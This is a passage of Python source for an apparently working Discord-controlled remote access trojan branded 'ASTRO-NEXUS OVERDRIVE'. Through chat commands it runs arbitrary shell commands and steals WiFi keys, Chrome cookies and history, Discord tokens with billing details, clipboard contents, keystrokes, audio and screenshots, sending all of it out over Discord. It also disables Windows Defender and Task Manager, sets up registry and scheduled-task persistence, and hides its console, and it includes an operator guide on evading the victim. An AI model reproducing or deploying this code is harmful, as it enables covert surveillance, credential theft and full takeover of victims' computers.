                    profiles = [i.split(":")[1][1:-1] for i in data.split('\n') if "All User Profile" in i]
                    res = ""
                    for i in profiles:
                        try:
                            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear'], creationflags=CREATE_NO_WINDOW).decode('utf-8', errors="backslashreplace")
                            results = [b.split(":")[1][1:-1] for b in results.split('\n') if "Key Content" in b]
                            res += f"{i:<30}|  {results[0] if results else ''}\n"
                        except: pass
                    await send_message_robustly(message.channel, f"**WiFi Passwords:**\n```\n{res}\n```" if res else "No wifi profiles found.")
                except:
                    await send_message_robustly(message.channel, "Failed to retrieve wifi passwords.")
            else:
                await send_message_robustly(message.channel, "`!wifi` is only supported on Windows.")
        elif message.content.startswith("!cmd "):
            def run_cmd():
                try:
                    out = subprocess.check_output(message.content[5:], shell=True, creationflags=CREATE_NO_WINDOW, stderr=subprocess.STDOUT).decode('utf-8', errors="replace")
                except subprocess.CalledProcessError as e:
                    out = e.output.decode('utf-8', errors="replace")
                return out
            out = await asyncio.to_thread(run_cmd)
            for i in range(0, len(out), 2000): await send_message_robustly(message.channel, f"```\n{out[i:i+2000]}\n```")
            for i in range(0, len(out), 2000): await message.channel.send(f"```\n{out[i:i+2000]}\n```")
        elif message.content.startswith("!upload "):
            args = message.content.split(" ")
            r = req_session.get(args[1])
            with open(args[2], 'wb') as f: f.write(r.content)
            await send_message_robustly(message.channel, f"✅ File uploaded to `{args[2]}`")
        elif message.content.startswith("!download "):
            path = message.content[10:]
            if os.path.exists(path): await send_message_robustly(message.channel, file=File(path))
            else: await send_message_robustly(message.channel, "❌ File not found.")
        elif message.content.startswith("!msg "):
            import ctypes
            msg = message.content[5:].split("|")
            threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, msg[1], msg[0], 0x40)).start()
            await send_message_robustly(message.channel, "✅ Message box deployed.")
        elif message.content.startswith("!kill "):
            subprocess.run(f"taskkill /F /IM {message.content[6:]}", shell=True, creationflags=CREATE_NO_WINDOW)
            await send_message_robustly(message.channel, f"✅ Process `{message.content[6:]}` terminated.")
        elif message.content.startswith("!wallpaper "):
            import ctypes
            r = req_session.get(message.content[11:])
            with open("bg.jpg", 'wb') as f: f.write(r.content)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath("bg.jpg"), 0)
            await send_message_robustly(message.channel, "✅ Wallpaper changed.")
        elif message.content == "!sysinfo":
            info = f"**User:** `{os.getlogin()}`\n**OS:** `{sys.platform}`\n**CWD:** `{os.getcwd()}`\n**Machine:** `{os.environ['COMPUTERNAME']}`"
            await send_message_robustly(message.channel, info)
        elif message.content == "!active":
            import ctypes
            window = ctypes.windll.user32.GetForegroundWindow()
            length = ctypes.windll.user32.GetWindowTextLengthW(window)
            buf = ctypes.create_unicode_buffer(length + 1)
            ctypes.windll.user32.GetWindowTextW(window, buf, length + 1)
            await send_message_robustly(message.channel, f"**Active Window:** `{buf.value}`")

        elif message.content == "!idle":
            import ctypes
            class LASTINPUTINFO(ctypes.Structure):
                _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
            lii = LASTINPUTINFO()
            lii.cbSize = ctypes.sizeof(lii)
            ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii))
            millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
            await send_message_robustly(message.channel, f"**User Idle Time:** `{millis / 1000:.2f}s`")

        elif message.content == "!admin":
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            await send_message_robustly(message.channel, f"**Privilege Level:** `{'Administrator' if is_admin else 'User'}`")

        elif message.content == "!tasks":
            try:
                out = subprocess.check_output("tasklist /FI \"MEMUSAGE gt 50000\"", shell=True, creationflags=CREATE_NO_WINDOW).decode('utf-8', errors="replace")
            except: out = "Error fetching tasklist"
            await send_message_robustly(message.channel, f"**Heavy Processes (>50MB):**\n```\n{out}\n```")

        elif message.content == "!net":
            ext = req_session.get('https://api.ipify.org').text
            try:
                int_ip = subprocess.check_output("ipconfig | findstr IPv4", shell=True, creationflags=CREATE_NO_WINDOW).decode('utf-8', errors="replace").split(" : ")[-1].strip()
            except: int_ip = "Unknown"
            await send_message_robustly(message.channel, f"**Network Intel:**\nExternal IP: `{ext}`\nInternal IP: `{int_ip}`")

        elif message.content.startswith("!search "):
            query = message.content[8:]
            def do_search():
                files = []
                for root, dirs, f_names in os.walk(os.getenv('USERPROFILE')):
                    for f in f_names:
                        if query.lower() in f.lower():
                            files.append(os.path.join(root, f))
                            if len(files) >= 15: break
                    if len(files) >= 15: break
                return files
            files = await asyncio.to_thread(do_search)
            await send_message_robustly(message.channel, f"**Search Results (First 15):**\n```\n" + "\n".join(files) + "\n```" if files else "No files found.")

        elif message.content == "!clipboard":
            import ctypes
            ctypes.windll.user32.OpenClipboard(0)
            pcontents = ctypes.windll.user32.GetClipboardData(13) # CF_UNICODETEXT
            data = ctypes.c_wchar_p(pcontents).value
            ctypes.windll.user32.CloseClipboard()
            await send_message_robustly(message.channel, f"**Clipboard Content:**\n```\n{data}\n```" if data else "Clipboard is empty or not text.")

        elif message.content.startswith("!audio"):
            try:
                import sounddevice as sd
                from scipy.io.wavfile import write
                fs = 44100
                duration = 10
                await send_message_robustly(message.channel, "🎙️ **Recording 10s audio...**")
                recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
                sd.wait()
                write('audio.wav', fs, recording)
                await send_message_robustly(message.channel, file=File('audio.wav'))
                os.remove('audio.wav')
            except Exception as e:
                await send_message_robustly(message.channel, f"Error: {e} (Make sure `sounddevice` and `scipy` are installed for audio recording)")

        elif message.content == "!cookies":
            try:
                cookie_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies')
                if os.path.exists(cookie_path):
                    await send_message_robustly(message.channel, "**🍪 Stealing Chrome Cookies...**", file=discord.File(cookie_path, filename="cookies.sqlite"))
                else:
                    await send_message_robustly(message.channel, "❌ Cookies not found.")
            except Exception as e:
                await message.channel.send(f"Error: {e}")

        elif message.content == "!help":
            embed = discord.Embed(title="🛸 ASTRO-NEXUS OVERDRIVE - MASTER GUIDE", description="Elite Reconnaissance & Remote Management Suite", color=0x07f0ec)
            embed.set_thumbnail(url="https://i.imgur.com/K6Y7x9G.png")
            embed.set_footer(text="Stealth Loop Active | ASTRO-NEXUS 2026")

            embed.add_field(name="🛰️ RECON", value="`!active`, `!idle`, `!sysinfo`, `!net`, `!tasks`, `!search`, `!clipboard`, `!browsers`, `!startup`, `!proclist`, `!antivm`", inline=False)
            
            embed.add_field(name="🛡️ TROJAN", value="`!grab`, `!ss`, `!clip`, `!wifi`, `!cookies`, `!history`, `!discordinfo`, `!audio`, `!webcam`, `!zip`, `!takeover`, `!keylog`, `!stream`", inline=False)

            embed.add_field(name="⚙️ SYSTEM", value="`!cmd`, `!run`, `!kill`, `!prockill`, `!upload`, `!download`, `!open`, `!volume`, `!tts`, `!play`, `!wallpaper`, `!message`, `!popup`, `!shutdown`, `!restart`, `!exit`, `!reverse`, `!backdoor`, `!persist`", inline=False)
            
            embed.add_field(name="💀 LETHAL", value="`!disablewifi`, `!noshell`, `!reshell`, `!notask`, `!yestask`, `!admin`, `!defender`, `!hide`, `!bgon`, `!bgoff`, `!ghost`", inline=False)
            
            embed.add_field(name="💼 MANAGEMENT", value="Numerical options (30-42) on console for server raiding. Check `!guide`.", inline=False)
            
            await message.channel.send(embed=embed)

        elif message.content == "!history":
            try:
                history_db = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'History')
                if os.path.exists(history_db):
                    shutil.copy2(history_db, "h.db")
                    conn = sqlite3.connect("h.db")
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 15")
                    rows = cursor.fetchall()
                    res = "\n".join([f"{r[1][:30]} - {r[0][:50]}" for r in rows])
                    conn.close()
                    os.remove("h.db")
                    await message.channel.send(f"**Recent Chrome History:**\n```\n{res}\n```")
                else:
                    await message.channel.send("❌ Chrome history not found.")
            except Exception as e:
                await message.channel.send(f"Error: {e}")

        elif message.content == "!discordinfo":
            try:
                tokens = AstroBackdoor.get_tokens()
                if not tokens:
                    await message.channel.send("❌ No tokens found.")
                    return
                token = tokens[0]
                res = req_session.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token}).json()
                billing = req_session.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers={"Authorization": token}).json()
                info = f"**User:** `{res['username']}#{res['discriminator']}`\n**ID:** `{res['id']}`\n**Email:** `{res.get('email', 'N/A')}`\n**Phone:** `{res.get('phone', 'N/A')}`\n**MFA:** `{res['mfa_enabled']}`\n**Billing:** `{len(billing)} methods`"
                await message.channel.send(info)
            except Exception as e:
                await message.channel.send(f"Error: {e}")

        elif message.content.startswith("!tts "):
            text = message.content[5:]
            cmd = f'Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak("{text}")'
            subprocess.Popen(['powershell', '-Command', cmd], shell=True, creationflags=CREATE_NO_WINDOW)
            await message.channel.send(f"🗣️ **Speaking:** `{text}`")

        elif message.content.startswith("!open "):
            url = message.content[6:]
            if not url.startswith("http"): url = "https://" + url
            subprocess.Popen(['start', url], shell=True, creationflags=CREATE_NO_WINDOW)
            await message.channel.send(f"🌐 **Opening Link:** `{url}`")

        elif message.content == "!volume":
            cmd = "$w=New-Object -ComObject WScript.Shell;for($i=0;$i -lt 50;$i++){$w.SendKeys([char]175)}"
            subprocess.Popen(['powershell', '-Command', cmd], shell=True, creationflags=CREATE_NO_WINDOW)
            await message.channel.send("🔊 **System Volume Maxed Out!**")

        elif message.content == "!defender":
            if ctypes.windll.shell32.IsUserAnAdmin() != 0:
                subprocess.Popen(['powershell', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $true'], shell=True, creationflags=CREATE_NO_WINDOW)
                await message.channel.send("🛡️ **Windows Defender Real-time Protection DISABLED.**")
            else:
                await message.channel.send("❌ **Admin Required!** Use `!admin` to check privileges.")

        elif message.content.startswith("!play "):
            url = message.content[6:]
            await message.channel.send(f"🎵 **Playing Remote Audio:** `{url}`")
            cmd = f'$p = New-Object -ComObject WMPlayer.OCX;$p.url = "{url}";$p.controls.play()'
            subprocess.Popen(['powershell', '-Command', cmd], shell=True, creationflags=CREATE_NO_WINDOW)

        elif message.content.startswith("!zip "):
            path = message.content[5:]
            if os.path.exists(path):
                await asyncio.to_thread(shutil.make_archive, "loot", 'zip', path)
                await message.channel.send(f"📦 **Zipped Folder:** `{path}`", file=discord.File("loot.zip"))
                os.remove("loot.zip")
            else:
                await message.channel.send("❌ Path not found.")

        elif message.content == "!startup":
            try:
                out = subprocess.check_output('reg query "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"', shell=True, creationflags=CREATE_NO_WINDOW).decode('utf-8', errors="replace")
                await message.channel.send(f"🚀 **System Autostart Entry:**\n```\n{out}\n```")
            except Exception as e:
                await message.channel.send(f"Error: {e}")

        elif message.content == "!browsers":
            paths = {
                "Edge": os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data'),
                "Brave": os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data'),
                "Opera": os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable'),
                "Chrome": os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data')
            }
            res = "**Installed Browsers / Data Found:**\n"
            for b, p in paths.items():
                res += f"{'✅' if os.path.exists(p) else '❌'} {b}\n"
            await message.channel.send(res)

        elif message.content == "!shutdown":
            await message.channel.send("💀 **Shutting down victim PC in 10s...**")
            subprocess.Popen(['shutdown', '/s', '/t', '10'], shell=True, creationflags=CREATE_NO_WINDOW)

        elif message.content == "!restart":
            await message.channel.send("🔄 **Restarting victim PC in 10s...**")
            subprocess.Popen(['shutdown', '/r', '/t', '10'], shell=True, creationflags=CREATE_NO_WINDOW)

        elif message.content.startswith("!message "):
            msg_parts = message.content[9:].split("|")
            title = msg_parts[0] if len(msg_parts) > 1 else "System Alert"
            text = msg_parts[1] if len(msg_parts) > 1 else msg_parts[0]
            cmd = f'Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("{text}", "{title}")'
            subprocess.Popen(['powershell', '-Command', cmd], shell=True, creationflags=CREATE_NO_WINDOW)
            await message.channel.send(f"📬 **Message Popup Sent:** `{text}`")

        elif message.content == "!disablewifi":
            if sys.platform == "win32":
                await message.channel.send("📶 **Disconnecting Victim from Network...**")
                subprocess.Popen(['netsh', 'interface', 'set', 'interface', 'name="Wi-Fi"', 'admin=disabled'], shell=True, creationflags=CREATE_NO_WINDOW)
                subprocess.Popen(['netsh', 'interface', 'set', 'interface', 'name="Ethernet"', 'admin=disabled'], shell=True, creationflags=CREATE_NO_WINDOW)
            else:
                await message.channel.send("`!disablewifi` is only supported on Windows.")

        elif message.content == "!noshell":
            if sys.platform == "win32":
                subprocess.Popen(['taskkill', '/F', '/IM', 'explorer.exe'], shell=True, creationflags=CREATE_NO_WINDOW)
                await message.channel.send("💀 **Shell Terminated (explorer.exe killed).**")
            else:
                await message.channel.send("`!noshell` is only supported on Windows.")

        elif message.content == "!reshell":
            if sys.platform == "win32":
                subprocess.Popen(['start', 'explorer.exe'], shell=True, creationflags=CREATE_NO_WINDOW)
                await message.channel.send("🔄 **Shell Restored.**")
            else:
                await message.channel.send("`!reshell` is only supported on Windows.")

        elif message.content == "!notask":
            if sys.platform == "win32":
                import ctypes
                if ctypes.windll.shell32.IsUserAnAdmin() != 0:
                    cmd = 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f'
                    subprocess.Popen(['powershell', '-Command', cmd], shell=True, creationflags=CREATE_NO_WINDOW)
                    await message.channel.send("💀 **Task Manager DISABLED via Registry.**")
                else:
                    await message.channel.send("❌ **Admin Required!** Use `!admin` to check status.")
            else:
                await message.channel.send("`!notask` is only supported on Windows.")

        elif message.content == "!yestask":
            if sys.platform == "win32":
                import ctypes
                if ctypes.windll.shell32.IsUserAnAdmin() != 0:
                    cmd = 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 0 /f'
                    subprocess.Popen(['powershell', '-Command', cmd], shell=True, creationflags=CREATE_NO_WINDOW)
                    await message.channel.send("🔄 **Task Manager ENABLED.**")
                else:
                    await message.channel.send("❌ **Admin Required.**")
            else:
                await message.channel.send("`!yestask` is only supported on Windows.")

        elif message.content == "!swap":
            if sys.platform == "win32":
                import ctypes
                ctypes.windll.user32.SwapMouseButton(True)
                await message.channel.send("🖱️ **Mouse Buttons SWAPPED.**")
            else:
                await message.channel.send("`!swap` is only supported on Windows.")

        elif message.content == "!unswap":
            if sys.platform == "win32":
                import ctypes
                ctypes.windll.user32.SwapMouseButton(False)
                await message.channel.send("🖱️ **Mouse Buttons RESTORED.**")
            else:
                await message.channel.send("`!unswap` is only supported on Windows.")

        elif message.content == "!ghost":
            if sys.platform == "win32":
                stealth_mode() # Hide the console window
                subprocess.Popen([sys.executable, sys.argv[0], "--ghost"], creationflags=0x08000000 | 0x00000008, close_fds=True) # Re-launch as ghost (if not already)
                await message.channel.send("👻 **Ghost mode activated.** Process hidden from view and running in background.")
            else:
                await message.channel.send("`!ghost` is currently supported only on Windows.")
        elif message.content == "!hide":
            if sys.platform == "win32":
                stealth_mode()
                await message.channel.send("🌑 **Astro-Nexus has vanished into the background.**")
            else:
                await message.channel.send("`!hide` (Stealth Mode) is only supported on Windows.")

        elif message.content == "!bgon":
            if sys.platform == "win32":
                stealth_mode()
                await message.channel.send("🌑 **Stealth Loop Engaged.** Console hidden.")
            else:
                await message.channel.send("`!bgon` is only supported on Windows.")

        elif message.content == "!bgoff":
            try:
                hWnd = ctypes.windll.kernel32.GetConsoleWindow()
                if hWnd != 0:
                    ctypes.windll.user32.ShowWindow(hWnd, 5) # 5 = SW_SHOW
                await message.channel.send("👁️ **Visual Mode Active.** Console visible.")
            except: pass


        elif message.content == "!takeover":
            await message.channel.send("📡 **Initiating takeover...** Gathering data. This might take a moment.")
            await collect_and_zip_data(message.channel)
        elif message.content.startswith("!backdoor "):
            global BACKUP_C2_URL
            args = message.content.split(" ")
            if len(args) == 2 and args[1] == "list":
                cfg = Files.load_config()
                saved_url = cfg.get("BackupC2", "None")
                await message.channel.send(f"Current Runtime C2: `{BACKUP_C2_URL}`\nPersisted C2: `{saved_url}`")
            elif len(args) == 3 and args[1] == "add":
                url = args[2]
                if not url.startswith("http"):
                    await message.channel.send("❌ Invalid URL format.")
                else:
                    BACKUP_C2_URL = url
                    if Files.update_config("BackupC2", url):
                        await message.channel.send(f"✅ Backup C2 URL saved and active: `{url}`")
                    else:
                        await message.channel.send(f"⚠️ Activated `{url}` but failed to save to config.")
            elif len(args) == 2 and args[1] == "remove":
                BACKUP_C2_URL = None
                Files.update_config("BackupC2", None)
                await message.channel.send("✅ Backup C2 URL removed from config and memory.")
            else:
                await message.channel.send("❌ **Usage:** `!backdoor list`, `!backdoor add <URL>`, `!backdoor remove`")
        elif message.content == "!keylog start":
            keylogger_instance.start()
            await message.channel.send("⌨️ **Keylogger started.** All keystrokes are now being logged.")
        elif message.content == "!keylog stop":
            keylogger_instance.stop()
            await message.channel.send("🛑 **Keylogger stopped.**")
        elif message.content == "!keylog dump":
            await message.channel.send("📝 **Dumping keylogger logs...**")
            await keylogger_instance.dump_logs(message.channel)
        elif message.content.startswith("!stream "):
            global screenshot_thread, SCREEN_STREAM_ACTIVE
            args = message.content.split(" ")
            if len(args) == 2 and args[1] == "start":
                if SCREEN_STREAM_ACTIVE:
                    await message.channel.send("❌ Screenshot stream is already active.")
                else:
                    await message.channel.send("📸 **Starting screenshot stream (5s interval)...**")
                    screenshot_thread = client.loop.create_task(start_screenshot_stream(message.channel, 5))
            elif len(args) == 2 and args[1] == "stop":
                if SCREEN_STREAM_ACTIVE:
                    stop_screenshot_stream()
                    if screenshot_thread:
                        screenshot_thread.cancel() # Stop the task
                    await message.channel.send("🛑 **Screenshot stream stopped.**")
                else:
                    await message.channel.send("❌ No active screenshot stream to stop.")
            else:
                await message.channel.send("❌ **Usage:** `!stream start` or `!stream stop`")
        elif message.content == "!proclist":
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
                try:
                    pinfo = proc.as_dict(attrs=['pid', 'name', 'cpu_percent', 'memory_percent'])
                    processes.append(f"PID: {pinfo['pid']} | Name: {pinfo['name']} | CPU: {pinfo['cpu_percent']:.1f}% | Mem: {pinfo['memory_percent']:.1f}%")
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess): pass
            
            output = "\n".join(processes)
            for i in range(0, len(output), 1900): await message.channel.send(f"```\n{output[i:i+1900]}\n```")
        elif message.content.startswith("!prockill "):
            target = message.content[11:].strip()
            killed = False
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    if target.lower() in proc.name().lower() or target == str(proc.pid):
                        proc.kill()
                        await message.channel.send(f"✅ Process `{proc.name()} (PID: {proc.pid})` terminated.")
                        killed = True
                        break
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess): pass
            if not killed:
                await message.channel.send(f"❌ Process `{target}` not found or could not be terminated.")
        elif message.content == "!persist add":
            if sys.platform == "win32":
                setup_scheduled_task_persistence()
                setup_registry_persistence()
                await message.channel.send(f"✅ **Persistence Activated** (Registry + Task Scheduler).")
            else:
                await message.channel.send("`!persist` is currently supported only on Windows.")
        elif message.content == "!persist remove":
            if sys.platform == "win32":
                remove_scheduled_task_persistence()
                remove_registry_persistence()
                await message.channel.send(f"✅ **Persistence Removed** (Registry + Task Scheduler).")
            else:
                await message.channel.send("`!persist` is currently supported only on Windows.")
        elif message.content == "!antivm":
            vm_status = check_for_vm()
            await message.channel.send(f"🕵️‍♂️ **VM Detection Status:** `{vm_status}`")
        elif message.content == "!guide":
            guide_embed = discord.Embed(title="📖 ASTRO-NEXUS OPERATIONAL GUIDE", color=0x07f0ec, description="Ekdam aasaan tareeka control karne ka.")
            guide_embed.add_field(name="1. Hamesha Chalu Rakhna", value="`!startup` use karo taaki PC restart ke baad bhi ye chalta rahe.")
            guide_embed.add_field(name="2. Chhupna aur Dikhna", value="Agar victim ko shak ho toh `!bgoff` se dikhao, phir `!bgon` se gayab ho jao.")
            guide_embed.add_field(name="3. Chori Kaise Kare?", value="`!zip` se poora folder uthao, `!grab` se Discord ID.")
            guide_embed.add_field(name="4. Remote Chalana", value="`!cmd` aur `!tasks` se poora PC tumhare hath mein.")
            await message.channel.send(embed=guide_embed)

        elif message.content == "!exit":
            await message.channel.send("💀 **Astro-Nexus Overdrive shutting down.**")
            if os.path.exists(BACKDOOR_LOCK):
                try: os.remove(BACKDOOR_LOCK)
                except: pass
            os._exit(0)
    except Exception as e:
        await message.channel.send(f"Error: {e}")

async def reinitialize_channel():
    global spy_channel
    try:
        guild = await client.fetch_guild(GUILD_ID) # Fetch guild for freshest data
        if not guild:
            print("Guild not found or accessible.")
            return False

        try: ip = req_session.get('https://api.ipify.org').text.replace('.', '-')
        except: ip = "local"

        channel_name = f"raider-{ip}"
        # Iterate through channels to avoid cache issues with discord.utils.get
        found_channel = None
        for channel in guild.text_channels:
            if channel.name == channel_name:
                found_channel = channel
                break

        dm_message = ""
        dm_success = False

        if found_channel:
            spy_channel = found_channel
            print(f"Reinitialized to existing channel: {channel_name}")
            dm_message = f"✅ **Victim Channel Found!**\nChannel: `#{channel_name}` (ID: `{spy_channel.id}`)\nStatus: Ready to receive commands."
            dm_success = True
        else:
            target = await client.fetch_user(USER_ID)
            overwrites = {guild.default_role: discord.PermissionOverwrite(read_messages=False), target: discord.PermissionOverwrite(read_messages=True)}
            category = client.get_channel(CATEGORY_ID)
            if category:
                spy_channel = await guild.create_text_channel(channel_name, category=category, overwrites=overwrites)
                print(f"Created new channel: {channel_name}")
                dm_message = f"🎉 **New Victim Channel Created!**\nChannel: `#{channel_name}` (ID: `{spy_channel.id}`)\nStatus: Ready to receive commands."
                dm_success = True
            else:
                # If category not found, create channel without category
                spy_channel = await guild.create_text_channel(channel_name, overwrites=overwrites)
                print(f"Created new channel (no category): {channel_name}")
                dm_message = f"🎉 **New Victim Channel Created (No Category)!**\nChannel: `#{channel_name}` (ID: `{spy_channel.id}`)\nStatus: Ready to receive commands."
                dm_success = True

        # Send DM notification to USER_ID
        user = None
        try:
            user = await client.fetch_user(USER_ID)
            if user:
                await user.send(dm_message) # Simple DM, no interactive buttons for now
                print("DM notification sent successfully.")
            else:
                print(f"Failed to find USER_ID ({USER_ID}) for DM notification.")
        except discord.errors.Forbidden:
            print(f"Discord.errors.Forbidden: Bot does not have permission to DM USER_ID ({USER_ID}). User might have DMs disabled or blocked the bot.")
        except Exception as dm_e:
            print(f"Error sending DM notification to {USER_ID}: {dm_e}")

        return dm_success
    except Exception as e:
        print(f"Error reinitializing channel: {e}")
        spy_channel = None # Ensure spy_channel is None on failure
        # Attempt to send a failure DM
        try:
            user = await client.fetch_user(USER_ID)
            if user:
                await user.send(f"❌ **Victim Channel Setup Failed!**\nError: ```{e}```\n\nManual intervention may be required. Try `!backdoor add <URL>` as a backup.")
        except discord.errors.Forbidden:
            print(f"Discord.errors.Forbidden: Bot does not have permission to DM USER_ID ({USER_ID}) on failure. User might have DMs disabled or blocked the bot.")
        except Exception as inner_e:
            print(f"Critical error: Failed to send failure DM to {USER_ID}: {inner_e}")
        return False

@client.event
async def on_ready():
    global spy_channel
    try:
        guild = client.get_guild(GUILD_ID)
        if not guild:
            return
            
        try: 
            ip = req_session.get('https://api.ipify.org', timeout=5).text.replace('.', '-')
        except: 
            ip = "local"
        
        channel_name = f"raider-{ip}"
        spy_channel = discord.utils.get(guild.text_channels, name=channel_name)
        
        if not spy_channel:
            target = await client.fetch_user(USER_ID)
            overwrites = {
                guild.default_role: discord.PermissionOverwrite(read_messages=False), 
                target: discord.PermissionOverwrite(read_messages=True)
            }
            category = client.get_channel(CATEGORY_ID)
            spy_channel = await guild.create_text_channel(channel_name, category=category, overwrites=overwrites)
        
        # Send startup message
        vic_os = platform.platform()
        await spy_channel.send(f"**🌌 NEXUS OVERRIDE CONNECTED**\nUser: `{os.getlogin()}`\nOS: `{vic_os}`\nStatus: `Stealth Loop Engaged`")
        
        # Send detailed embed
        embed = discord.Embed(title="🛸 ASTRO-NEXUS OVERDRIVE - CONNECTED", color=0x07f0ec, description=f"New target acquired: `{os.getlogin()}`")
        embed.set_thumbnail(url="https://i.imgur.com/K6Y7x9G.png")
        embed.set_footer(text="Stealth Loop Active | ASTRO-NEXUS 2026")
        embed.add_field(name="🛰️ RECON", value="`!active`, `!idle`, `!sysinfo`, `!net`, `!tasks`, `!search`, `!clipboard`, `!browsers`, `!startup`", inline=False)
        embed.add_field(name="🛡️ TROJAN", value="`!grab`, `!ss`, `!clip`, `!wifi`, `!cookies`, `!history`, `!discordinfo`, `!audio`, `!webcam`, `!zip`, `!takeover`, `!keylog`", inline=False)
        embed.add_field(name="⚙️ SYSTEM", value="`!cmd`, `!run`, `!kill`, `!upload`, `!download`, `!open`, `!volume`, `!tts`, `!play`, `!wallpaper`, `!message`, `!popup`, `!shutdown`, `!restart`, `!exit`, `!reverse`, `!backdoor`", inline=False)
        embed.add_field(name="💀 LETHAL", value="`!disablewifi`, `!noshell`, `!reshell`, `!notask`, `!yestask`, `!admin`, `!defender`, `!hide`, `!bgon`, `!bgoff`, `!ghost`", inline=False)
        await send_message_robustly(spy_channel, embed=embed)
        
        # Send DM notification to owner
        try:
            owner = await client.fetch_user(USER_ID)
            await owner.send(f"✅ **NEXUS CONNECTED**\nChannel: `#{channel_name}`\nTarget: `{os.getlogin()}`\nOS: `{vic_os}`")
        except: pass
            
    except: pass

@client.event
async def on_message(msg):
    try:
        if msg.author == client.user: 
            return
        if not spy_channel:
            return
        if msg.channel.id != spy_channel.id: 
            return
        await handle_backdoor(msg)
    except Exception as e:
        try:
            await msg.channel.send(f"⚠️ Error: {str(e)[:100]}")
        except:
            pass

tls_session = tls_client.Session(client_identifier="chrome_138", random_tls_extension_order=True, ja3_string="771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-5-10-11-13-16-18-23-27-35-43-45-51-17613-65037-65281,4588-29-23-24,0", h2_settings={"HEADER_TABLE_SIZE": 65536, "ENABLE_PUSH": 0, "INITIAL_WINDOW_SIZE": 6291456, "MAX_HEADER_LIST_SIZE": 262144}, h2_settings_order=["HEADER_TABLE_SIZE", "ENABLE_PUSH", "INITIAL_WINDOW_SIZE", "MAX_HEADER_LIST_SIZE"], supported_signature_algorithms=["ecdsa_secp256r1_sha256", "rsa_pss_rsae_sha256", "rsa_pkcs1_sha256", "ecdsa_secp384r1_sha384", "rsa_pss_rsae_sha384", "rsa_pkcs1_sha384", "rsa_pss_rsae_sha512", "rsa_pkcs1_sha512"], supported_versions=["TLS_1_3", "TLS_1_2"], key_share_curves=["GREASE", "X25519MLKEM768", "X25519", "secp256r1", "secp384r1"], pseudo_header_order=[":method", ":authority", ":scheme", ":path"], connection_flow=15663105, priority_frames=[])

def get_random_str(length):
    return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def wrapper(func):
    def wrapper(*args, **kwargs):
        console.clear()
        console.render_ascii()
        result = func(*args, **kwargs)
        return result
    return wrapper

C = {
    "green": h("#65fb07"),
    "red": h("#Fb0707"),
    "yellow": h("#FFCD00"),
    "magenta": h("#b207f5"),
    "blue": h("#00aaff"),
    "cyan": h("#aaffff"),
    "gray": h("#8a837e"),
    "white": h("#DCDCDC"),
    "pink": h("#c203fc"),
    "light_blue": h("#07f0ec"),
    "brown": h("#8B4513"),
    "black": h("#000000"),
    "aqua": h("#00CED1"),
    "purple": h("#800080"),
    "lime": h("#00FF00"),
    "orange": h("#FFA500"),
    "indigo": h("#4B0082"),
    "violet": h("#EE82EE"),
    "gold": h("#FFD700"),
    "silver": h("#C0C0C0"),
    "teal": h("#008080"),
    "navy": h("#000080"),
    "olive": h("#808000"),
    "maroon": h("#800000"),
    "coral": h("#FF7F50"),
    "salmon": h("#FA8072"),
    "khaki": h("#F0E68C"),
    "orchid": h("#DA70D6"),
    "rose": h("#FF007F")
}

class Files:
    @staticmethod
    def write_config():
        try:
            if not os.path.exists("config.json"):
                data = {
                    "Proxies": False,
                    "Theme": "light_blue", 
                    "BackupC2": None 
                }
                with open("config.json", "w") as f:
                    json.dump(data, f, indent=4)
        except Exception as e:
            console.log("Failed", C["red"], "Failed to Write Config", e)

    @staticmethod
    def write_folders():
        folders = ["data", "scraped"]
        for folder in folders:
            try:
                if not os.path.exists(folder):
                    os.mkdir(folder)
            except Exception as e:
                console.log("Failed", C["red"], "Failed to Write Folders", e)

    @staticmethod
    def write_files():
        files = ["tokens.txt", "proxies.txt"]
        for file in files:
            try:
                path = f"data/{file}"
                if not os.path.exists(path):
                    with open(path, "a") as f:
                        f.close()
            except Exception as e:
                console.log("Failed", C["red"], "Failed to Write Files", e)

    @staticmethod
    def load_config():
        try:
            if os.path.exists("config.json"):
                with open("config.json", "r") as f:
                    return json.load(f)
        except: pass
        return {}

    @staticmethod
    def update_config(key, value):
        try:
            config = Files.load_config()
            config[key] = value
            with open("config.json", "w") as f:
                json.dump(config, f, indent=4)
            return True
        except: return False

    @staticmethod
    def run_tasks():
        tasks = [Files.write_config, Files.write_folders, Files.write_files]
        for task in tasks:
            task()

Files.run_tasks()
